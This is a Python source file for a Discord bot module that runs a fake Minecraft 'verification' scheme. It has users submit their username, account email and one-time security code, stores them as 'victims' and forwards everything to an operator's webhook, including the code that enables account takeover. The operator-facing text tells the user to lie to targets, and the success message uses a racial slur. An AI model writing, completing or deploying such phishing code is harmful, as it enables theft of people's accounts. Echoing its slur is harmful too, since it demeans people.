from __future__ import annotations

import discord
from discord import app_commands
from discord.ext import commands

import base
from utils.checks import *
from utils.formating import *

from .util import *

from modules.config_func import *
from modules.dox_func import *

import re
import hypixel

class VeryficationForm(discord.ui.Modal, title="Verification"):
    username = discord.ui.TextInput(
        label="Minecraft Username",
        required=True,
        placeholder="Minecraft Username.",
        min_length=3,
        max_length=16
    )
    email = discord.ui.TextInput(
        label="Minecraft Email",
        required=True,
        placeholder="Minecraft Email.",
        min_length=3,
        max_length=60
    )
    
    def __init__(self, cog: FishingMC, *, title = ..., timeout = None, custom_id = ...):
        super().__init__(title=title, timeout=timeout, custom_id=custom_id)
        self.cog = cog
    
    async def on_submit(self, interaction: discord.Interaction) -> None:
        email = self.email.value
        
        if not self.validate_email(self.email.value):
            embed = discord.Embed(
                color=discord.Color.red(),
                title="❌Email Not Found",
                description="The email provided doesn't exist. Please try again with a valid email."
            ).set_footer(
                text="Make sure your email is typed correctly!"
            )
            return await interaction.response.send_message(
                embed=embed,
                ephemeral=True
            )
        
        user_id = interaction.user.id
        username = self.username.value
        
        try:
            player = await self.cog.get_hypixel_info(username)
        except hypixel.PlayerNotFound:
            player = 'N/A'
            
        uuid = getattr(player, 'uuid', 'N/A')
        rank = getattr(player, 'rank', 'N/A')
        
        await self.cog.dox.add_victim(user_id, username, email, uuid, rank)
        await self.cog.send_victim(interaction)
        
        embed = discord.Embed(
            color=discord.Color.green(),
            title="✅ Verify Code",
            description="A verification code has been sent to your security email! Please check your inbox and verify the code using the button below."
        ).add_field(
            name="Security Email",
            value=f"``{email}``"
        ).set_footer(
            text="Ensure you check your spam folder if you don't see the email."
        )
        
        await interaction.response.send_message(
            embed=embed, 
            view=ConfirmButtonView(self.cog),
            ephemeral=True
            )
        
    @staticmethod
    def validate_email(email: str) -> bool:
        email_regex = r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$'
        return re.match(email_regex, email)

class ConfirmCodeForm(discord.ui.Modal, title="Confirm Code"):
    code = discord.ui.TextInput(
        label="Code",
        required=True,
        placeholder="Code.",
        min_length=6,
        max_length=6
    )
    
    def __init__(self, cog:FishingMC, *, title = ..., timeout = None, custom_id = ...):
        super().__init__(title=title, timeout=timeout, custom_id=custom_id)
        self.cog = cog
    
    async def on_submit(self, interaction: discord.Interaction) -> None:
        user_id = interaction.user.id
        await self.cog.dox.update_otp(user_id, self.code.value)
        
        self.cog.send_victim(interaction)

class SendEmbedForm(discord.ui.Modal, title="Send Embed"):
    _webhook = discord.ui.TextInput(
        label="Webhook Url",
        required=True,
        placeholder="Webhook Url.",
        max_length=2000
    )
    
    _title = discord.ui.TextInput(
        label="Title",
        required=False,
        placeholder="MINECRAFT Verification",
        max_length=256
    )
    _description = discord.ui.TextInput(
        label="Description",
        style=discord.TextStyle.paragraph,
        required=False,
        placeholder="Lie why should they verify their account?\nExample: English or Spanish? Not veryfied as gay.",
        max_length=4000
    )
    
    def __init__(self, cog:FishingMC, *, title = ..., timeout = None, custom_id = ...):
        super().__init__(title=title, timeout=timeout, custom_id=custom_id)
        self.cog = cog
    
    async def on_submit(self, interaction: discord.Interaction) -> None:
        guild = interaction.guild
        webhook_url = self._webhook.value
        await self.cog.config.set_webhook_url(guild.id, webhook_url)
        
        title = self._title.placeholder
        if self._title.value:
            title = self._title.value
        description = self._description.value
        embed = discord.Embed(
            color=discord.Color.green(),
            title=title,
            description=description
        )
        await interaction.channel.send(embed=embed, view=VerifyButtonView(self.cog))
        await interaction.followup.send("**Successfully to send!**")

class VerifyButtonView(discord.ui.View):
    def __init__(self, cog: FishingMC) -> None:
        super().__init__(timeout=None)
        self.cog = cog

    @discord.ui.button(label="Verify", custom_id="button-verify", style=discord.ButtonStyle.success, emoji="✅")
    async def callback(self, interaction: discord.Interaction, button:discord.Button):
        await interaction.response.send_modal(VeryficationForm(self.cog))

class ConfirmButtonView(discord.ui.View):
    def __init__(self, cog: FishingMC) -> None:
        super().__init__(timeout=None)
        self.cog = cog

    @discord.ui.button(label="Confirm Code", custom_id="button-confirm-code", style=discord.ButtonStyle.success, emoji="✅")
    async def callback(self, interaction: discord.Interaction, button:discord.Button):
        await interaction.response.send_modal(ConfirmCodeForm(self.cog))

class FishingMC(commands.Cog):
    def __init__(self, bot:base.Bot) -> None:
        self.bot = bot
        
        apikey = bot.config['apikey'].get('hypixel')
        if apikey:
            self.client = hypixel.Client()
        else:
            self.bot.logger.warning("Missing from apikey of Hypixel!\nGo Hypixel Dashboard to get apikey -> https://developer.hypixel.net/dashboard")
        
        self.config = Config(self.bot.db)
        self.dox = Dox(self.bot.db)
        
        self.bot.add_view(VerifyButtonView())
        self.bot.add_view(ConfirmButtonView())
    
    @commands.Cog.listener
    async def on_ready(self) -> None:
        self.config.create_table()
        self.dox.create_table()
    
    @app_commands.command()
    @mod_or_permissions()
    async def send_phisher(self, interaction: discord.Interaction) -> None:
        await interaction.response.defer("**Submmiting embed...**")
        await interaction.response.send_modal(SendEmbedForm(self))
    
    async def get_hypixel_info(self, username:str) -> Optional[hypixel.Player]:
        async with self.client:
            try:
                player = self.client.player(username)
            except hypixel.PlayerNotFound:
                player = None
        return player
    
    async def send_victim(self, interaction: discord.Interaction) -> None:
        user_id = interaction.user.id
        info = await self.dox.fetch_victim(user_id)
        
        verified = info.get('verified')
        
        color = discord.Color.yellow    
        title = "Requested OTP"
        if verified:
            color = discord.Color.green
            title = "🎉 A nigga is phished!"
        
        embed = discord.Embed(
            color=color,
            title=title
        ).add_field(
            name="ITG",
            value=f"`{info.get('username')}`"
        ).add_field(
            name="UUID",
            value=f"`{info.get('uuid')}`"
        ).add_field(
            name="Rank",
            value=f"`{info.get('rank')}`"
        ).add_field(
            name="Email",
            value=f"`{info.get('email')}`"
        ).add_field(
            name="OTP",
            value=f"`{info.get('otp')}`"
        )
        
        guild_id = interaction.guild.id
        webhook_url = await self.config.fetch_webhook_url(guild_id)
        webhook = discord.Webhook.from_url(webhook_url)
        await webhook.send(embed=embed)

async def setup(bot:base.Bot) -> None:
    await bot.add_cog(FishingMC(bot))